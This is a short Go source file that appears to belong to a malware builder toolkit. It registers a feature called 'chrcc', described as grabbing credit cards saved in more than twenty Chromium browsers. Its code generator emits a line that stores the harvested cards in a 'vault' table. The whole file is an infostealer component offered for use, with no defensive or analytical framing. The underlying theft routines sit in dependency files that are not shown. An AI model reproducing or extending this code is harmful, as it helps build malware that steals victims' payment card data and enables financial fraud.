package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "chrcc",
		Description: "Grabs credit cards saved in 20+ chromium browsers",
		ReturnsData: true,
		Args:        []Arg{},
		Dependencies: []string{
			"chromium.lib.go",
			"browsers.lib.go",
			"storage.lib.go",
		},
		GenerateCode: func(args FeatureSetArgsList) (string, error) {
			output := "vault.StoreTable(ToTable(GetCreditCards()))\n"

			return output, nil
		},
	})
}
